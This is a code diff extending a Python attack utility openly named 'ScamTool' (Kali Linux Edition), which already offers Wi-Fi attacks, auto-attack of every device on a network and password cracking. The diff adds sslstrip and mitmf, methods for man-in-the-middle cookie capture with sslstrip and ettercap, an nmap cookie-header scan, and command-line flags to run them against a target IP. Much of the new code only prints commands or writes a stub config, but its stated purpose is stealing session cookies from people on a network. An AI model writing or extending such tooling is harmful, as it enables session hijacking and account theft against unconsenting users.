@@ -22,7 +22,9 @@ class ScamTool:
             'hashcat': 'hashcat',
             'wifite': 'wifite',
             'aircrack-ng': 'aircrack-ng',
-            'ettercap': 'ettercap'
+            'ettercap': 'ettercap',
+            'sslstrip': 'sslstrip',
+            'mitmf': 'mitmf'
         }
         self.results_dir = "./scam_results"
         self.create_results_dir()
@@ -174,6 +176,69 @@ class ScamTool:
         
         return True
     
+    def capture_cookies_mitm(self, target_ip, interface):
+        """Capture cookies using MITM attack"""
+        print(f"Capturing cookies from {target_ip} using MITM attack")
+        try:
+            # This is a simplified version - in practice, you'd use ettercap or mitmf
+            print("Starting MITM attack to capture cookies...")
+            print("Note: This requires proper network configuration and permissions")
+            print("Use ettercap or mitmf for full cookie capture functionality")
+            
+            # Create a simple capture command
+            capture_cmd = [
+                'sslstrip', '-l', '8080', '-w', f'{self.results_dir}/cookies.txt'
+            ]
+            print(f"Cookie capture command: {' '.join(capture_cmd)}")
+            
+            print("Cookie capture setup completed")
+            return True
+        except Exception as e:
+            print(f"Error during cookie capture: {e}")
+            return False
+    
+    def capture_cookies_with_ettercap(self, target_ip, interface):
+        """Capture cookies using Ettercap"""
+        print(f"Capturing cookies using Ettercap for {target_ip}")
+        try:
+            # Ettercap command for cookie capture
+            print("Setting up Ettercap for cookie capture...")
+            print("Note: Ettercap requires root privileges and proper network setup")
+            print("This would typically run as: ettercap -G")
+            print("And then use the GUI to perform MITM attack")
+            
+            # Create a basic configuration file for ettercap
+            ettercap_config = f"""
+# Ettercap configuration for cookie capture
+TARGETS = {target_ip}
+INTERFACE = {interface}
+"""
+            
+            with open(f'{self.results_dir}/ettercap_config.txt', 'w') as f:
+                f.write(ettercap_config)
+            
+            print("Ettercap configuration created")
+            return True
+        except Exception as e:
+            print(f"Error during Ettercap cookie capture: {e}")
+            return False
+    
+    def find_cookie_files(self, network_range):
+        """Look for cookie files on the network"""
+        print("Looking for cookie files on network...")
+        try:
+            # This would typically use nmap scripts or other methods to find cookie files
+            result = subprocess.run([
+                'nmap', '--script', 'http-cookie-headers', network_range
+            ], capture_output=True, text=True, check=True)
+            
+            print("Cookie file scan results:")
+            print(result.stdout)
+            return result.stdout
+        except subprocess.CalledProcessError as e:
+            print(f"Error during cookie file scan: {e}")
+            return None
+    
     def run(self, args):
         """Main execution method"""
         print("Starting Scam Tool - Kali Linux Edition")
@@ -185,12 +250,14 @@ class ScamTool:
             return
         
         # If no arguments provided, show help
-        if not args.network and not args.attack_wifi and not args.auto_attack:
+        if not any([args.network, args.attack_wifi, args.auto_attack, args.cookie_capture, args.find_cookies]):
             print("Usage: python scam_tool.py")
             print("  --network <network_range>     : Scan network")
             print("  --attack-wifi <ssid>          : Attack Wi-Fi network")
             print("  --auto-attack <network_range> : Auto-attack all devices")
             print("  --hash-file <file>            : Crack passwords")
+            print("  --cookie-capture <target_ip>  : Capture cookies from target")
+            print("  --find-cookies <network_range>: Find cookie files on network")
             return
         
         # Handle auto-attack mode
@@ -216,6 +283,16 @@ class ScamTool:
             elif args.cracker == 'hashcat':
                 crack_result = self.crack_passwords_with_hashcat(args.hash_file, args.wordlist)
         
+        # Handle cookie capture
+        if args.cookie_capture and args.interface:
+            print("Starting cookie capture...")
+            self.capture_cookies_mitm(args.cookie_capture, args.interface)
+        
+        # Handle cookie finding
+        if args.find_cookies:
+            print("Finding cookie files...")
+            cookie_results = self.find_cookie_files(args.find_cookies)
+        
         print("Scam Tool execution finished.")
 
 def main():
@@ -227,6 +304,8 @@ def main():
     parser.add_argument('--cracker', choices=['john', 'hashcat'], default='john', help='Password cracker to use')
     parser.add_argument('--wordlist', default='/usr/share/wordlists/rockyou.txt', help='Wordlist file for cracking')
     parser.add_argument('--auto-attack', help='Auto-attack all devices in network range')
+    parser.add_argument('--cookie-capture', help='Capture cookies from target IP')
+    parser.add_argument('--find-cookies', help='Find cookie files on network')
     
     args = parser.parse_args()
     
